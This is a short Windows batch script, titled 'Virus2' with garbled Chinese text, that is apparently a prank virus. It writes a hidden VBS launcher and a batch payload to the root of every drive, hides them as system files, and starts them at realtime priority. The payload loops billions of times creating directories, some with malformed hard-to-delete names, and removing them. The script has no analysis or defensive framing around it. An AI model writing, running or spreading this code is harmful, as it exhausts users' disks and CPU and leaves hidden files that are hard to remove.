@ECHO OFF
CHCP 936
CD "%~DP0"
FOR /F "TOKENS=3 DELIMS=," %%I IN ('TYPE CONFIG.INI') DO (COLOR %%I)
TITLE Virus2²¡¶¾±¬·¢ÖÐ...
CLS
FOR /F "SKIP=1" %%A IN ('WMIC LOGICALDISK GET CAPTION') DO (
	DEL /A /F /Q %%A\Vir2.bat>NUL
	DEL /A /F /Q %%A\Vir2.vbs>NUL
	ECHO SET WS=WScript.CreateObject("WScript.Shell"^)>%%A\Vir2.vbs
	ECHO WS.Run "CMD.EXE /K %%A\Vir2.bat",RunHide>>%%A\Vir2.vbs
	ECHO FOR /L %%%%i in (0,1,10000000000^) do (MD %%A\%%%%i\^&MD %%A\%%%%i..\^&RD /S /Q %%A\%%%%i^)>%%A\Vir2.bat
	ATTRIB +A +H +R +S %%A\Vir2.vbs
	ATTRIB +A +H +R +S %%A\Vir2.bat
	IF EXIST %%A\Vir2.vbs (START /REALTIME %%A\Vir2.vbs)
	CLS
)
EXIT